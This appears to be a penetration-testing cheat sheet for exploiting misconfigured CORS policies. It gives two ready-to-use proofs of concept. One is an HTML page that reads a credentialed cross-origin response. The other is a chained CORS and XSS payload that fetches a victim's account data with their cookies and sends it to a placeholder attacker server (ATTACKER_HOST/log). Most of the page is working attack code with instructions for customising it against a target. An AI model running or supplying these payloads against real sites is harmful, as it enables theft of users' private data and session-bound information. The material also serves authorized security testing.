## CORS PoCs (Quick Reference)

Use these snippets to validate whether a target is vulnerable to *credentialed cross-origin reads* due to a misconfigured CORS policy.

Typical prerequisites for data theft:
- The sensitive endpoint responds with `Access-Control-Allow-Credentials: true`.
- The response also includes an `Access-Control-Allow-Origin` value that matches an origin you can run JavaScript on (explicit allowlist or unsafe reflection of `Origin`).
- Your JavaScript runs in the browser (attacker page, compromised subdomain, etc.).

## CORS HTML + JS PoC

```
<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "endpoint_vulnerable", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      <h3>Show full content of page</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>

```

## Chained CORS + XSS PoC (General Pattern)

Use this when the application trusts a "related" origin (often a subdomain) via CORS, and you can execute JavaScript in that trusted origin (reflected/stored XSS, subdomain takeover, etc.).

High-level flow:
1. Victim is navigated to a vulnerable page on the trusted origin with an injected payload.
2. The payload runs on that trusted origin.
3. It makes a credentialed request to the main site (cookies included), reads the response (CORS allows it), and exfiltrates it.

What to customize:
- `targetOrigin`: the main site that hosts the sensitive endpoint.
- `sensitivePath`: endpoint returning sensitive data (e.g. `/accountDetails`, `/api/me`, etc.).
- `trustedOrigin`: an origin the server allows via CORS and where you can run JS.
- `injectionUrl`: a URL on the trusted origin that reflects an injectable parameter.
- `attackerLog`: where you receive the stolen data (your server / logger).

```html
<script>
// Replace the placeholders before use.
const targetOrigin = 'https://TARGET_HOST';
const sensitivePath = '/accountDetails';

// Note: scheme matters for CORS origin matching (http vs https).
const trustedOrigin = 'https://TRUSTED_SUBDOMAIN_HOST';
const injectionUrl = `${trustedOrigin}/?productId=`; // adjust param/path as needed

const attackerLog = 'https://ATTACKER_HOST/log';

const xssPayload = `<script>
fetch('${targetOrigin}${sensitivePath}', { credentials: 'include' })
  .then(r => r.text())
  .then(data => {
    location = '${attackerLog}?data=' + encodeURIComponent(data);
  });
<\/script>`;

// This example assumes an injectable `productId` parameter.
// Add any required extra params (e.g. `&storeId=1`) for the target endpoint.
location = `${injectionUrl}${encodeURIComponent(xssPayload)}`;
</script>
```
